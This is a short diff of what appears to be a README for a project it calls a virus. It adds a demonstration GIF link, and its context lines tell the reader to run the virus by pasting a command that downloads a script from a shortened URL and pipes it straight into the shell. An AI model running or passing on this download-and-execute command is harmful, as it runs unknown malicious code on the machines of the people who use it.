@@ -14,3 +14,5 @@ To execute the virus, copy and paste the command below:
 ```sh
 curl -L https://bit.ly/4fJCXo0 | sh
 ```
+## Demonstration
+[demo_gif](/demonstration/demo.gif);
